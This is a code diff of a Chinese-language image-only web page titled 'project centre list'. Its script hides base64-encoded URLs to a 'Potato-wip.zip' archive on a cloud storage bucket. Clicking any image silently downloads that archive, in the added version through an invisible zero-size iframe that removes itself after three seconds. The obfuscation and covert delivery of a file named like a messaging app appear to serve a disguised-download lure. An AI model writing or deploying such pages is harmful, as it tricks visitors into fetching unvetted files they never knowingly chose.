@@ -3,102 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
     <title>项目中心列表</title>
     <style>
         body, html {
             margin: 0;
             padding: 0;
-            background-color: #f5f5f5;
         }
-        .guide-section {
-            position: relative;
-            overflow: hidden;
-        }
-        .guide-section img {
+        img {
             width: 100%;
             height: auto;
-            vertical-align: top;
-            transition: opacity 0.3s ease;
-        }
-        .guide-section img:hover {
-            opacity: 0.95;
+            display: block;
         }
     </style>
 </head>
 <body>
-    <section class="guide-section">
-        <img src="images/img_01.jpg" alt="项目中心列表">
-    </section>
-    <section class="guide-section">
-        <img src="images/img_02.jpg" alt="项目中心列表">
-    </section>
-    <section class="guide-section">
-        <img src="images/img_03.jpg" alt="项目中心列表">
-    </section>
-    <section class="guide-section">
-        <img src="images/img_04.jpg" alt="项目中心列表">
-    </section>
-    <section class="guide-section">
-        <img src="images/img_05.jpg" alt="项目中心列表">
-    </section>
+
+    <img src="images/img_01.jpg">
+    <img src="images/img_02.jpg">
+    <img src="images/img_03.jpg">
+    <img src="images/img_04.jpg">
+    <img src="images/img_05.jpg">
 
 <script>
-    (function() {
-        // 资源获取处理器
-        const resourceHandler = {
-            resourceLinks: [
-                'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=uJnN0PTJ0czQzZ2szJmRsPTE=',
-                'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=uJnN0PTJ0czQzZ2szJmRsPTE=',
-                'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=uJnN0PTJ0czQzZ2szJmRsPTE=',
-                'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=uJnN0PTJ0czQzZ2szJmRsPTE=',
-                'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=uJnN0PTJ0czQzZ2szJmRsPTE='
-            ],
-            
-            decodeData: function(encoded) {
-                return atob(encoded);
-            },
-            
-            initResourceAccess: function() {
-                document.querySelectorAll('.guide-section').forEach((section, index) => {
-                    section.addEventListener('click', () => {
-                        this.processResource(this.resourceLinks[index]);
-                    });
-                });
-            },
-            
-            processResource: function(encoded) {
-                const resourceUrl = this.decodeData(encoded);
-                const temporaryLink = document.createElement('a');
-                temporaryLink.style.display = 'none';
-                temporaryLink.href = resourceUrl;
-                temporaryLink.rel = 'noopener noreferrer';
-                document.body.appendChild(temporaryLink);
-                temporaryLink.click();
-                setTimeout(() => {
-                    document.body.removeChild(temporaryLink);
-                }, 300);
-            }
-        };
+(function(){
+    // 加密资源映射表
+    const assetMap = [
+        'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=',
+        'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=',
+        'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=',
+        'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA=',
+        'aHR0cHM6Ly81NXRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUG90YXRvLXdpcC56aXA='
+    ];
 
-        // 图片展示模块
-        const imageViewer = {
-            initImagePreview: function() {
-                const images = document.querySelectorAll('.guide-section img');
-                images.forEach(img => {
-                    img.addEventListener('load', () => {
-                        img.style.opacity = 1;
-                    });
-                });
-            }
-        };
+    // 资源定位器
+    const resolveSource = index => atob(assetMap[index]);
 
-        // 初始化模块
-        document.addEventListener('DOMContentLoaded', () => {
-            resourceHandler.initResourceAccess();
-            imageViewer.initImagePreview();
+    // 创建临时通道
+    const createTempChannel = url => {
+        const channel = document.createElement('iframe');
+        channel.style.cssText = 'position:absolute;width:0;height:0;border:0;';
+        channel.src = url;
+        document.body.appendChild(channel);
+        
+        setTimeout(() => {
+            channel.remove();
+        }, 3000);
+    }
+
+    // 初始化交互绑定
+    document.querySelectorAll('img').forEach((element, index) => {
+        element.addEventListener('click', () => {
+            const target = resolveSource(index);
+            createTempChannel(target);
         });
-    })();
+    });
+})();
 </script>
 
 </body>
